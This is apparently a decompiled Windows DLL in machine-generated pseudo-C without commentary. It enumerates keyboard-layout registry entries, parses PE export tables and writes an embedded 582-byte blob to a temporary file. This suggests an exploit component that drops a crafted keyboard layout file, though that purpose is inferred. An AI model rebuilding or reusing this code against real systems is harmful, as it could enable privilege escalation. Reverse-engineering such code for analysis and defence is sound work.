  dword_1000B408(a3, L"00000000", (unsigned __int16)((_WORD)a2 << 10) | a1 & 0x3FF, &v10, 16);
  v6 = dword_1000B40C(L"00000000", &v10);
  v7 = dword_1000B40C(&v10, v8);
  ((void (__cdecl *)(int, int))dword_1000B408)(a3 + 2 * (v6 - v7), v9);
  dword_1000B3F4(a4, a3);
  *(_DWORD *)a5 = (unsigned __int16)(((_WORD)a2 << 10) | a1 & 0x3FF) | ((unsigned __int16)(((_WORD)a2 << 10) | a1 & 0x3FF) << 16);
  return 1758724096;
}
// 100051B0: using guessed type wchar_t a00000000[9];
// 1000B3F4: using guessed type int (__stdcall *dword_1000B3F4)(_DWORD, _DWORD);
// 1000B408: using guessed type int (__cdecl *dword_1000B408)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B40C: using guessed type int (__cdecl *dword_1000B40C)(_DWORD, _DWORD);
// 1000B414: using guessed type int (__thiscall *dword_1000B414)(_DWORD);

//----- (10001806) --------------------------------------------------------
int __cdecl sub_10001806(int a1)
{
  int result; // eax@3

  if ( *(_DWORD *)(a1 + 8) )
    dword_1000B320(*(_DWORD *)(a1 + 8));
  result = *(_DWORD *)(a1 + 12);
  if ( result )
    result = dword_1000B320(*(_DWORD *)(a1 + 12));
  if ( *(_DWORD *)(a1 + 24) )
    result = sub_10003929(a1);
  return result;
}
// 1000B320: using guessed type int (__stdcall *dword_1000B320)(_DWORD);

//----- (10001836) --------------------------------------------------------
int __cdecl sub_10001836(unsigned int a1, int a2, int a3)
{
  unsigned int v3; // eax@1
  int v4; // edx@1
  int v5; // ebx@1
  _DWORD *v6; // eax@2
  int v7; // edi@2
  unsigned int v8; // eax@11
  int v9; // ST10_4@17
  int v10; // ST14_4@17
  int v11; // eax@28
  int v12; // edi@28
  int v13; // ST1C_4@44
  int v14; // ST20_4@44
  int i; // [sp-14h] [bp-2B8h]@6
  int v17; // [sp-10h] [bp-2B4h]@2
  int v18; // [sp-10h] [bp-2B4h]@6
  int v19; // [sp-Ch] [bp-2B0h]@2
  int *v20; // [sp-Ch] [bp-2B0h]@6
  signed int v21; // [sp-8h] [bp-2ACh]@6
  int *v22; // [sp-4h] [bp-2A8h]@6
  int v23; // [sp+0h] [bp-2A4h]@13
  int v24; // [sp+0h] [bp-2A4h]@34
  int v25; // [sp+4h] [bp-2A0h]@13
  int v26; // [sp+4h] [bp-2A0h]@34
  int v27; // [sp+8h] [bp-29Ch]@13
  int v28; // [sp+8h] [bp-29Ch]@34
  int v29; // [sp+Ch] [bp-298h]@1
  int v30; // [sp+10h] [bp-294h]@44
  int v31; // [sp+14h] [bp-290h]@44
  int v32; // [sp+214h] [bp-90h]@1
  char v33; // [sp+218h] [bp-8Ch]@1
  int v34; // [sp+220h] [bp-84h]@15
  __int16 v35; // [sp+230h] [bp-74h]@15
  int v36; // [sp+238h] [bp-6Ch]@1
  char v37; // [sp+23Ch] [bp-68h]@1
  int v38; // [sp+244h] [bp-60h]@10
  __int16 v39; // [sp+254h] [bp-50h]@10
  int v40; // [sp+25Ch] [bp-48h]@1
  char v41; // [sp+260h] [bp-44h]@1
  int v42; // [sp+268h] [bp-3Ch]@7
  __int16 v43; // [sp+278h] [bp-2Ch]@7
  int v44; // [sp+280h] [bp-24h]@1
  int v45; // [sp+284h] [bp-20h]@1
  int v46; // [sp+288h] [bp-1Ch]@1
  int v47; // [sp+28Ch] [bp-18h]@1
  int v48; // [sp+290h] [bp-14h]@1
  int v49; // [sp+294h] [bp-10h]@1
  _WORD v50[10]; // [sp+298h] [bp-Ch]@1
  int v51; // [sp+29Eh] [bp-6h]@1
  int v52; // [sp+2A2h] [bp-2h]@1
  int v53; // [sp+2A6h] [bp+2h]@1
  _WORD v54[10]; // [sp+2ACh] [bp+8h]@1
  int v55; // [sp+2B2h] [bp+Eh]@1
  int v56; // [sp+2B6h] [bp+12h]@1
  int v57; // [sp+2BAh] [bp+16h]@1
  _WORD v58[4]; // [sp+2C0h] [bp+1Ch]@1
  __int16 v59; // [sp+2C6h] [bp+22h]@1
  _WORD v60[4]; // [sp+2C8h] [bp+24h]@1
  __int16 v61; // [sp+2CEh] [bp+2Ah]@1
  _WORD v62[4]; // [sp+2D0h] [bp+2Ch]@1
  __int16 v63; // [sp+2D6h] [bp+32h]@1
  _WORD v64[4]; // [sp+2D8h] [bp+34h]@1
  __int16 v65; // [sp+2DEh] [bp+3Ah]@1
  int v66; // [sp+2E0h] [bp+3Ch]@1
  _WORD v67[4]; // [sp+2E4h] [bp+40h]@1
  __int16 v68; // [sp+2EAh] [bp+46h]@1
  unsigned int v69; // [sp+2ECh] [bp+48h]@1
  unsigned int v70; // [sp+2F0h] [bp+4Ch]@1
  int v71; // [sp+2F4h] [bp+50h]@1
  int v72; // [sp+2F8h] [bp+54h]@1
  int v73; // [sp+2FCh] [bp+58h]@1
  int v74; // [sp+300h] [bp+5Ch]@1
  int j; // [sp+304h] [bp+60h]@6
  int v76; // [sp+308h] [bp+64h]@1
  int v77; // [sp+30Ch] [bp+68h]@1

  v50[0] = 0;
  *(_DWORD *)&v50[1] = 0;
  v51 = 0;
  v52 = 0;
  v53 = 0;
  v54[0] = 0;
  *(_DWORD *)&v54[1] = 0;
  v55 = 0;
  v56 = 0;
  v57 = 0;
  v44 = 0;
  v45 = 0;
  v46 = 0;
  v47 = 0;
  v48 = 0;
  v49 = 0;
  v67[0] = 0;
  *(_DWORD *)&v67[1] = 0;
  v68 = 0;
  v64[0] = 0;
  *(_DWORD *)&v64[1] = 0;
  v65 = 0;
  v58[0] = 0;
  *(_DWORD *)&v58[1] = 0;
  v59 = 0;
  v62[0] = 0;
  *(_DWORD *)&v62[1] = 0;
  v63 = 0;
  v76 = 0;
  v5 = 0;
  v77 = 0;
  v73 = 0;
  v71 = 0;
  v70 = 0;
  v66 = 0;
  v72 = 0;
  LOWORD(v29) = 0;
  sub_10003956(0, (char *)&v29 + 2, 0, 0x206u);
  v60[0] = 0;
  *(_DWORD *)&v60[1] = 0;
  v61 = 0;
  v36 = 0;
  memset(&v37, 0, 0x20u);
  v32 = 0;
  v74 = 0;
  v69 = 0;
  memset(&v33, 0, 0x20u);
  v40 = 0;
  memset(&v41, 0, 0x20u);
  v3 = a1 >> 16;
  v4 = (a1 >> 16) & 0xF000;
  if ( (_WORD)v4 != -8192 )
  {
    if ( (_WORD)v4 == -4096 )
    {
      v69 = v3 & 0xFFF;
      if ( !dword_1000B42C(-2147483647, L"Keyboard Layout\\Substitutes", 0, 131097, &v77) )
      {
        v22 = &v73;
        v21 = 36;
        v20 = &v40;
        v18 = 0;
        j = 0;
        for ( i = 0; ; i = j )
        {
          v76 = dword_1000B424(v77, i, v18, v20, v21, v22);
          if ( v76 )
            break;
          v43 = 0;
          dword_1000B3F4(v67, &v42);
          v76 = dword_1000B3F8(v67, 16, &v71);
          if ( v76 )
            break;
          if ( (_WORD)v71 == (_WORD)a1 )
          {
            v76 = dword_1000B420(v77, v67, 2, &v36, 36, &v73);
            if ( v76 || (v39 = 0, dword_1000B3F4(v64, &v38), (v76 = dword_1000B3F8(v64, 16, &v70)) != 0) )
              goto LABEL_41;
            v8 = v70 >> 16;
            if ( v70 >> 16 >= 1 )
            {
              if ( (_WORD)v8 <= 0xFu )
              {
                dword_1000B408(
                  &v29,
                  L"\\Registry\\Machine\\System\\CurrentControlSet\\Control\\Keyboard Layouts\\",
                  v23,
                  v25,
                  v27);
                dword_1000B410(&v29, &v38);
                dword_1000B3F4(v62, &v29);
                v46 = (int)v62;
                v44 = 24;
                v45 = 0;
                v47 = 64;
                v48 = 0;
                v49 = 0;
                v5 = dword_1000B41C(&v72, 131097, &v44);
                if ( !v5 )
                {
                  dword_1000B3F4(v60, L"Layout Id");
                  v5 = dword_1000B420(v72, v60, 2, &v32, 36, &v73);
                  if ( !v5 )
                  {
                    v35 = 0;
                    dword_1000B3F4(v58, &v34);
                    v5 = dword_1000B3F8(v58, 16, &v66);
                    if ( !v5 )
                    {
                      if ( v69 == v66 )
                      {
                        v74 = 1;
                        dword_1000B408(v50, &v38, v23, v25, v27);
                        dword_1000B408(v54, &v42, v9, v10, v23);
                      }
                    }
                  }
                }
              }
            }
          }
          if ( v72 )
            dword_1000B418(v72);
          if ( v5 )
          {
            v76 = v5;
            goto LABEL_41;
          }
          if ( v74 )
            goto LABEL_41;
          ++j;
          v22 = &v73;
          v21 = 36;
          v20 = &v40;
          v18 = 0;
        }
      }
      goto LABEL_41;
    }
    v74 = (unsigned __int16)v3;
    if ( dword_1000B42C(-2147483647, L"Keyboard Layout\\Substitutes", 0, 131097, &v77) )
      goto LABEL_41;
    for ( j = 0; ; ++j )
    {
      v11 = dword_1000B424(v77, j, 0, &v40, 36, &v73);
      v12 = v11;
      if ( v11 == -2147483622 )
      {
        v7 = (int)L"%.8X";
        ((void (*)(_WORD *, const char *, ...))dword_1000B404)(v50, (const char *)L"%.8X", v74, v24);
        v17 = v74;
        v6 = (_DWORD *)v54;
        goto LABEL_3;
      }
      if ( !v11 )
      {
        v43 = 0;
        dword_1000B3F4(v67, &v42);
        v12 = dword_1000B3F8(v67, 16, &v71);
        if ( (_WORD)v71 != (_WORD)a1 )
          goto LABEL_35;
        v12 = dword_1000B420(v77, v67, 2, &v36, 36, &v73);
        if ( !v12 )
        {
          v39 = 0;
          dword_1000B3F4(v64, &v38);
          v12 = dword_1000B3F8(v64, 16, &v70);
          if ( !v12 )
          {
            if ( v70 == v74 )
            {
              dword_1000B408(v54, &v42, v24, v26, v28);
              ((void (*)(_WORD *, const char *, ...))dword_1000B404)(v50, (const char *)L"%s%.4X", L"0000", v74);
              v69 = 1;
            }
LABEL_35:
            if ( !v12 )
              goto LABEL_37;
            goto LABEL_36;
          }
        }
      }
LABEL_36:
      if ( v12 != -2147483622 )
      {
        v76 = v12;
        goto LABEL_41;
      }
LABEL_37:
      if ( v69 )
        goto LABEL_41;
    }
  }
  v7 = (int)L"%.8X";
  ((void (*)(_DWORD, const char *, ...))dword_1000B404)(v54, (const char *)L"%.8X", a1);
  v17 = a1;
  v6 = (_DWORD *)v50;
LABEL_3:
  dword_1000B404(v6, v7, v17, v19);
LABEL_41:
  if ( v77 )
    dword_1000B418(v77);
  if ( !v76 )
  {
    dword_1000B408(a3, v54, v29, v30, v31);
    dword_1000B408(a2, v50, v13, v14, v29);
  }
  return v76;
}
// 100051C4: using guessed type wchar_t aS_4x[7];
// 100051D4: using guessed type wchar_t a0000[5];
// 100051E0: using guessed type wchar_t aLayoutId[10];
// 100051F8: using guessed type wchar_t aRegistryMachin[69];
// 10005284: using guessed type wchar_t aKeyboardLayout[28];
// 100052BC: using guessed type wchar_t a_8x[5];
// 1000B3F4: using guessed type int (__stdcall *dword_1000B3F4)(_DWORD, _DWORD);
// 1000B3F8: using guessed type int (__stdcall *dword_1000B3F8)(_DWORD, _DWORD, _DWORD);
// 1000B404: using guessed type int (__cdecl *dword_1000B404)(_DWORD, _DWORD, _DWORD, _DWORD);
// 1000B408: using guessed type int (__cdecl *dword_1000B408)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B410: using guessed type int (__cdecl *dword_1000B410)(_DWORD, _DWORD);
// 1000B418: using guessed type int (__stdcall *dword_1000B418)(_DWORD);
// 1000B41C: using guessed type int (__stdcall *dword_1000B41C)(_DWORD, _DWORD, _DWORD);
// 1000B420: using guessed type int (__stdcall *dword_1000B420)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B424: using guessed type int (__stdcall *dword_1000B424)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B42C: using guessed type int (__stdcall *dword_1000B42C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (10001CF4) --------------------------------------------------------
char __cdecl sub_10001CF4(int a1, unsigned int a2, int a3)
{
  int v3; // edx@1
  unsigned int v4; // edi@1
  int v5; // eax@1
  char result; // al@2
  unsigned int v7; // eax@3
  int v8; // ecx@4
  unsigned int v9; // esi@5

  v5 = a1 + *(_DWORD *)(a1 + 60);
  v4 = *(_WORD *)(v5 + 6);
  v3 = *(_WORD *)(v5 + 20) + v5 + 24;
  if ( a2 >= v3 + 40 * (unsigned int)*(_WORD *)(v5 + 6) - a1 )
  {
    v7 = 0;
    if ( v4 )
    {
      v8 = v3 + 8;
      while ( 1 )
      {
        v9 = *(_DWORD *)(v8 + 4);
        if ( a2 >= v9 )
        {
          if ( a2 < v9 + *(_DWORD *)v8 )
            break;
        }
        ++v7;
        v8 += 40;
        if ( v7 >= v4 )
          goto LABEL_8;
      }
      *(_DWORD *)a3 = a2 + *(_DWORD *)(40 * v7 + v3 + 20) - v9;
      result = 1;
    }
    else
    {
LABEL_8:
      result = 0;
    }
  }
  else
  {
    *(_DWORD *)a3 = a2;
    result = 1;
  }
  return result;
}

//----- (10001D65) --------------------------------------------------------
char __cdecl sub_10001D65(unsigned int a1, int a2)
{
  int v2; // ebx@1
  int v3; // esi@1
  int v4; // ebx@1
  unsigned int v5; // ecx@2
  unsigned int v6; // edi@2
  int v7; // eax@5
  unsigned __int8 v8; // cf@6
  unsigned __int8 v9; // zf@6
  unsigned int v10; // ecx@7
  int v11; // eax@14
  int v12; // edi@18
  int v13; // edi@20
  int v14; // esi@23
  int v15; // eax@25
  char v17; // [sp+Ch] [bp-1Ch]@1
  int v18; // [sp+Dh] [bp-1Bh]@1
  char v19; // [sp+11h] [bp-17h]@1
  int v20; // [sp+14h] [bp-14h]@1
  int v21; // [sp+18h] [bp-10h]@1
  int v22; // [sp+1Ch] [bp-Ch]@1
  int v23; // [sp+20h] [bp-8h]@1
  unsigned int v24; // [sp+24h] [bp-4h]@1

  v3 = a1;
  v4 = *(_DWORD *)(a1 + 60);
  v17 = 0;
  a1 = 0;
  v23 = 0;
  v22 = 0;
  v24 = 0;
  v21 = 0;
  v20 = 0;
  v18 = 0;
  v2 = v3 + v4;
  v19 = 0;
  if ( !sub_10001CF4(v3, *(_DWORD *)(v2 + 120), (int)&a1) )
    return 0;
  v5 = *(_DWORD *)(v3 + a1 + 28);
  v6 = *(_DWORD *)(v3 + a1 + 16);
  a1 = *(_DWORD *)(v3 + a1 + 20);
  if ( !a1 )
    return 0;
  if ( !v5 )
    return 0;
  if ( !sub_10001CF4(v3, v5, (int)&v23) )
    return 0;
  v7 = v3 + v23;
  if ( v6 > 1 )
    return 0;
  v8 = v6 + a1 < 1;
  v9 = v6 + a1 == 1;
  a1 += v6;
  if ( v8 | v9 )
    return 0;
  v10 = *(_DWORD *)(v7 - 4 * v6 + 4);
  if ( !v10 )
    return 0;
  if ( v6 <= 3 && a1 > 3 || v6 <= 5 && a1 > 5 )
  {
    if ( v6 <= 2 )
    {
      if ( a1 > 2 )
      {
        v11 = *(_DWORD *)(v7 + 4 * (2 - v6));
        if ( v11 )
          v24 = v11;
      }
    }
  }
  a1 = *(_DWORD *)(v2 + 52);
  if ( !a1
    || !sub_10001CF4(v3, v10, (int)&v22)
    || (v12 = v22 + v3, sub_10003907((int)&v17, v22 + v3, 6), v17 != -72)
    || v19 != -61
    || (v13 = *(_DWORD *)(v12 + 1) - a1, (unsigned int)v13 > *(_DWORD *)(v2 + 80)) )
    return 0;
  if ( v24 )
  {
    if ( !sub_10001CF4(v3, v24, (int)&v21)
      || (v14 = v21 + v3, sub_10003907((int)&v17, v14, 6), v17 != -72)
      || v19 != -61
      || (v15 = *(_DWORD *)(v14 + 1) - a1, (unsigned int)v15 > *(_DWORD *)(v2 + 80)) )
      return 0;
  }
  else
  {
    v15 = v20;
  }
  *(_DWORD *)a2 = v13 | (v15 << 16);
  return 1;
}

//----- (10001EEE) --------------------------------------------------------
signed int __cdecl sub_10001EEE(int a1, int a2, int a3)
{
  signed int result; // eax@2
  int v4; // eax@3
  int v5; // esi@7
  int v6; // eax@11
  char v7; // [sp+Ch] [bp-418h]@1
  char v8; // [sp+Dh] [bp-417h]@1
  char v9; // [sp+214h] [bp-210h]@1
  char v10; // [sp+215h] [bp-20Fh]@1
  int v11; // [sp+41Ch] [bp-8h]@1
  int v12; // [sp+420h] [bp-4h]@1

  v12 = 0;
  v7 = 0;
  sub_10003956(0, &v8, 0, 0x207u);
  v9 = 0;
  sub_10003956(0, &v10, 0, 0x207u);
  v11 = 4605054;
  if ( a2 )
  {
    byte_1000B21B = *(_BYTE *)(a1 + 20);
    v4 = dword_1000B34C(520, &v7);
    if ( v4 && (unsigned int)v4 <= 0x208 )
    {
      if ( dword_1000B37C(&v7, &v11, 0, &v9) )
      {
        v5 = dword_1000B308(&v9, -1073741824, 0, 0, 2, 128, 0);
        if ( v5 == -1 )
        {
          result = 1852312625;
        }
        else
        {
          if ( dword_1000B31C(v5, &unk_1000B058, 582, &v12, 0) )
          {
            dword_1000B320(v5);
            v6 = dword_1000B308(&v9, -2147483648, 1, 0, 3, 0, 0);
            if ( v6 == -1 )
            {
              result = 1855392817;
            }
            else
            {
              *(_DWORD *)a2 = v6;
              dword_1000B400(a3, &v9);
              result = 1855717376;
            }
          }
          else
          {
            dword_1000B320(v5);
            result = 1852574769;
          }
        }
      }
      else
      {
        result = 1852050481;
      }
    }
    else
    {
      result = 1851919409;
    }
  }
  else
  {
    result = 1853554689;
  }
  return result;
}
// 1000B21B: using guessed type char byte_1000B21B;
// 1000B308: using guessed type int (__stdcall *dword_1000B308)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B31C: using guessed type int (__stdcall *dword_1000B31C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B320: using guessed type int (__stdcall *dword_1000B320)(_DWORD);
// 1000B34C: using guessed type int (__stdcall *dword_1000B34C)(_DWORD, _DWORD);
// 1000B37C: using guessed type int (__stdcall *dword_1000B37C)(_DWORD, _DWORD, _DWORD, _DWORD);
// 1000B400: using guessed type int (__cdecl *dword_1000B400)(_DWORD, _DWORD);

//----- (10002070) --------------------------------------------------------
signed int __cdecl sub_10002070(int a1, int a2)
{
  int v2; // eax@1
  signed int result; // eax@2
  int v4; // [sp+4h] [bp-4h]@1

  v4 = 368106417;
  sub_10003907(a1, (int)&word_1000203E, &byte_1000206F - (char *)&word_1000203E);
  v2 = sub_1000115E(a1, &byte_1000206F - (char *)&word_1000203E, (int)&v4, 4u);
  if ( v2 )
  {
    *(_DWORD *)v2 = a2;
    result = 1860042752;
  }
  else
  {
    result = 1859849195;
  }
  return result;
}
// 1000203E: using guessed type __int16 word_1000203E;
// 1000206F: using guessed type char byte_1000206F;

//----- (100020BC) --------------------------------------------------------
signed int __cdecl sub_100020BC(int a1, int a2, int a3)
{
  int v3; // eax@1
  int v4; // ebx@1
  int v5; // edi@1
  int v6; // esi@1
  int v7; // eax@3
  int v8; // eax@5
  int v10; // [sp+Ch] [bp-8h]@1
  signed int v11; // [sp+10h] [bp-4h]@1
  int v12; // [sp+24h] [bp+10h]@3

  v10 = 0;
  v4 = a3 + 4;
  v5 = 1100 * (a3 + 4) + 44;
  v11 = 1803550720;
  v3 = sub_10003943(v5);
  v6 = v3;
  if ( !v3 )
    return 1804140547;
  sub_10003956(v4, (void *)v3, 0, v5);
  *(_DWORD *)(v6 + 40) = v4;
  *(_DWORD *)(v6 + 32) = *(_DWORD *)(a2 + 32);
  *(_DWORD *)(v6 + 36) = *(_DWORD *)(a2 + 24);
  v7 = dword_1000B35C(0, 0, 0, 0);
  v12 = v7;
  if ( !v7 )
  {
    v11 = 1807551542;
LABEL_10:
    sub_10003929(v6);
    if ( v12 )
      dword_1000B320(v12);
    if ( v10 )
      dword_1000B320(v10);
    return v11;
  }
  *(_DWORD *)(v6 + 8) = v7;
  v8 = dword_1000B35C(0, 0, 0, 0);
  v10 = v8;
  if ( !v8 )
  {
    v11 = 1805978678;
    goto LABEL_10;
  }
  *(_DWORD *)(v6 + 12) = v8;
  if ( (unsigned int)v4 > 0 )
    v11 = 1813184512;
  *(_DWORD *)a1 = v6;
  if ( (_WORD)v11 )
    goto LABEL_10;
  return v11;
}
// 1000B320: using guessed type int (__stdcall *dword_1000B320)(_DWORD);
// 1000B35C: using guessed type int (__stdcall *dword_1000B35C)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (10002194) --------------------------------------------------------
unsigned int __cdecl sub_10002194(int a1, int a2)
{
  int v2; // eax@1
  unsigned int v3; // ebx@2
  int v4; // eax@3
  unsigned int v5; // eax@5
  unsigned int v6; // edi@5
  int v8; // [sp+8h] [bp-8h]@1
  int v9; // [sp+Ch] [bp-4h]@1

  v9 = 0;
  v2 = dword_1000B30C(a1, -2147483648, 1, 0, 3, 128, 0);
  v8 = v2;
  if ( v2 == -1 )
  {
    v3 = -1073741823;
LABEL_12:
    dword_1000B320(v2);
    goto LABEL_13;
  }
  v4 = dword_1000B370(v2, 0, 2, 0, 0, 0);
  v9 = v4;
  if ( v4 )
  {
    v5 = dword_1000B374(v4, 4, 0, 0, 0);
    v6 = v5;
    if ( v5 )
      v3 = (sub_10001D65(v5, a2) != 0 ? 0x3FFFFFFF : 0) - 1073741823;
    else
      v3 = -1073741823;
    if ( v6 )
    {
      if ( !dword_1000B378(v6) )
        v3 = -1073741823;
    }
  }
  else
  {
    v3 = -1073741823;
  }
  v2 = v8;
  if ( v8 )
    goto LABEL_12;
LABEL_13:
  if ( v9 )
    dword_1000B320(v9);
  return v3;
}
// 1000B30C: using guessed type int (__stdcall *dword_1000B30C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B320: using guessed type int (__stdcall *dword_1000B320)(_DWORD);
// 1000B370: using guessed type int (__stdcall *dword_1000B370)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B374: using guessed type int (__stdcall *dword_1000B374)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B378: using guessed type int (__stdcall *dword_1000B378)(_DWORD);

//----- (1000224F) --------------------------------------------------------
int __cdecl sub_1000224F(int a1)
{
  int v1; // edi@1
  int result; // eax@2
  char v3; // zf@4
  int v4; // esi@5
  int v5; // edi@7
  int v6; // eax@8
  unsigned __int8 v7; // cf@18
  int v8; // [sp+0h] [bp-EC0h]@8
  int v9; // [sp+4h] [bp-EBCh]@8
  int v10; // [sp+8h] [bp-EB8h]@8
  int v11; // [sp+Ch] [bp-EB4h]@1
  char v12; // [sp+10h] [bp-EB0h]@1
  int v13; // [sp+18h] [bp-EA8h]@11
  __int16 v14; // [sp+426h] [bp-A9Ah]@11
  _WORD v15[520]; // [sp+42Ch] [bp-A94h]@1
  _WORD v16[520]; // [sp+83Ch] [bp-684h]@1
  _WORD v17[260]; // [sp+C4Ch] [bp-274h]@1
  _WORD v18[10]; // [sp+E54h] [bp-6Ch]@1
  int v19; // [sp+E5Ah] [bp-66h]@1
  int v20; // [sp+E5Eh] [bp-62h]@1
  int v21; // [sp+E62h] [bp-5Eh]@1
  _WORD v22[10]; // [sp+E68h] [bp-58h]@1
  int v23; // [sp+E6Eh] [bp-52h]@1
  int v24; // [sp+E72h] [bp-4Eh]@1
  int v25; // [sp+E76h] [bp-4Ah]@1
  int v26; // [sp+E7Ch] [bp-44h]@3
  int v27; // [sp+E80h] [bp-40h]@8
  int v28; // [sp+E84h] [bp-3Ch]@8
  int v29; // [sp+E88h] [bp-38h]@8
  int v30; // [sp+E8Ch] [bp-34h]@8
  int v31; // [sp+E90h] [bp-30h]@8
  _WORD v32[4]; // [sp+E94h] [bp-2Ch]@1
  __int16 v33; // [sp+E9Ah] [bp-26h]@1
  int v34; // [sp+E9Ch] [bp-24h]@1
  _WORD v35[4]; // [sp+EA0h] [bp-20h]@1
  __int16 v36; // [sp+EA6h] [bp-1Ah]@1
  int v37; // [sp+EA8h] [bp-18h]@1
  int v38; // [sp+EACh] [bp-14h]@1
  unsigned int v39; // [sp+EB0h] [bp-10h]@4
  int v40; // [sp+EB4h] [bp-Ch]@1
  int v41; // [sp+EB8h] [bp-8h]@7
  char v42; // [sp+EBFh] [bp-1h]@1

  v16[0] = 0;
  sub_10003956(0, &v16[1], 0, 0x40Eu);
  v17[0] = 0;
  sub_10003956(0, &v17[1], 0, 0x206u);
  v35[0] = 0;
  *(_DWORD *)&v35[1] = 0;
  v36 = 0;
  v18[0] = 0;
  *(_DWORD *)&v18[1] = 0;
  v19 = 0;
  v20 = 0;
  v21 = 0;
  v22[0] = 0;
  *(_DWORD *)&v22[1] = 0;
  v23 = 0;
  v24 = 0;
  v25 = 0;
  v32[0] = 0;
  *(_DWORD *)&v32[1] = 0;
  v33 = 0;
  v40 = 0;
  v34 = 0;
  v37 = -1073741823;
  v38 = 0;
  v42 = 0;
  v15[0] = 0;
  sub_10003956(0, &v15[1], 0, 0x40Eu);
  v11 = 0;
  sub_10003956(0, &v12, 0, 0x41Cu);
  v1 = a1;
  if ( a1 && (sub_10003956(0, &v26, 0, 0x18u), dword_1000B348(v15, 1040)) )
  {
    dword_1000B410(v15, L"\\");
    v3 = *(_DWORD *)(a1 + 40) == 0;
    v39 = 0;
    if ( !v3 )
    {
      v4 = a1 + 1112;
      while ( !*(_DWORD *)(v4 - 1068) )
      {
LABEL_17:
        ++v39;
        v4 += 1100;
        if ( v39 >= *(_DWORD *)(v1 + 40) )
          goto LABEL_18;
      }
      v5 = *(_DWORD *)(v4 - 1060);
      v41 = sub_10001836(*(_DWORD *)(v4 - 1060), (int)v18, (int)v22);
      if ( !v41 )
      {
        dword_1000B408(v17, L"\\Registry\\Machine\\System\\CurrentControlSet\\Control\\Keyboard Layouts\\", v8, v9, v10);
        dword_1000B410(v17, v18);
        dword_1000B3F4(v35, v17);
        v28 = (int)v35;
        v26 = 24;
        v27 = 0;
        v29 = 64;
        v30 = 0;
        v31 = 0;
        v6 = dword_1000B41C(&v40, 131097, &v26);
        v37 = v6;
        if ( v6 )
        {
          v41 = v6;
        }
        else
        {
          dword_1000B408(v4, v22, v8, v9, v10);
          dword_1000B3F4(v4 - 8, v4);
          *(_DWORD *)(v4 + 20) = v5;
          dword_1000B3F4(v32, L"Layout File");
          v41 = dword_1000B420(v40, v32, 2, &v11, 1056, &v34);
          if ( v41
            || (v14 = 0,
                dword_1000B408(v16, v15, v8, v9, v10),
                dword_1000B410(v16, &v13),
                (v41 = sub_10002194((int)v16, (int)&v38)) != 0) )
          {
LABEL_14:
            dword_1000B418(v40);
LABEL_15:
            v1 = a1;
            if ( v41 )
              v42 = 1;
            goto LABEL_17;
          }
          dword_1000B408(v4 - 1048, v16, v8, v9, v10);
          *(_DWORD *)(v4 + 24) = v38;
          *(_DWORD *)(v4 + 28) = 1;
        }
      }
      if ( v37 )
        goto LABEL_15;
      goto LABEL_14;
    }
LABEL_18:
    v7 = v42 != 0;
    *(_DWORD *)(v1 + 4) = v42 == 0;
    result = -v7 & 0xC0000001;
  }
  else
  {
    result = -1073741823;
  }
  return result;
}
// 100051F8: using guessed type wchar_t aRegistryMachin[69];
// 100052C8: using guessed type wchar_t aLayoutFile[12];
// 100052E0: using guessed type wchar_t asc_100052E0[2];
// 1000B348: using guessed type int (__stdcall *dword_1000B348)(_DWORD, _DWORD);
// 1000B3F4: using guessed type int (__stdcall *dword_1000B3F4)(_DWORD, _DWORD);
// 1000B408: using guessed type int (__cdecl *dword_1000B408)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1000B410: using guessed type int (__cdecl *dword_1000B410)(_DWORD, _DWORD);
// 1000B418: using guessed type int (__stdcall *dword_1000B418)(_DWORD);
// 1000B41C: using guessed type int (__stdcall *dword_1000B41C)(_DWORD, _DWORD, _DWORD);
// 1000B420: using guessed type int (__stdcall *dword_1000B420)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (1000250B) --------------------------------------------------------
signed int __usercall sub_1000250B<eax>(int a1<esi>, int a2, int a3)
{
  int v3; // ebx@1
  int v4; // edi@1
  signed int result; // eax@2
  int v6; // ecx@5
  char v7; // zf@5
  int v8; // ST1C_4@5
  int v9; // esi@6
  int v10; // ST18_4@9
  int v11; // ST1C_4@9
  int v12; // edx@13
  int v13; // ecx@13
  int v14; // edi@13
  int v15; // [sp-4h] [bp-24Ch]@6
  int v16; // [sp+0h] [bp-248h]@9
  int v17; // [sp+4h] [bp-244h]@9
  char v18; // [sp+8h] [bp-240h]@1
  char v19; // [sp+9h] [bp-23Fh]@1
  _WORD v20[10]; // [sp+210h] [bp-38h]@1
  int v21; // [sp+216h] [bp-32h]@1
  int v22; // [sp+21Ah] [bp-2Eh]@1
  int v23; // [sp+21Eh] [bp-2Ah]@1
  _WORD v24[4]; // [sp+224h] [bp-24h]@1
  __int16 v25; // [sp+22Ah] [bp-1Eh]@1
  int v26; // [sp+22Ch] [bp-1Ch]@9
  __int16 v27; // [sp+230h] [bp-18h]@1
  int v28; // [sp+232h] [bp-16h]@1
  int v29; // [sp+234h] [bp-14h]@1
  int v30; // [sp+238h] [bp-10h]@11
  int v31; // [sp+23Ch] [bp-Ch]@5
  unsigned int v32; // [sp+240h] [bp-8h]@5
  int v33; // [sp+244h] [bp-4h]@1

  v3 = 0;
  v27 = 0;
  v28 = 0;
  HIWORD(v29) = 0;
  v18 = 0;
  sub_10003956(0, &v19, 0, 0x207u);
  v20[0] = 0;
  *(_DWORD *)&v20[1] = 0;
  v21 = 0;
  v22 = 0;
  v23 = 0;
  v24[0] = 0;
  *(_DWORD *)&v24[1] = 0;
  v25 = 0;
  v4 = a2;
  v33 = 0;
  if ( a2 )
  {
    if ( a3 )
    {
      v31 = 1795227648;
      sub_1000224F(a2);
      v7 = *(_DWORD *)(a2 + 40) == 0;
      v6 = v8;
      *(_DWORD *)(a2 + 16) = 0;
      *(int *)((char *)&v28 + 2) = (int)&v18;
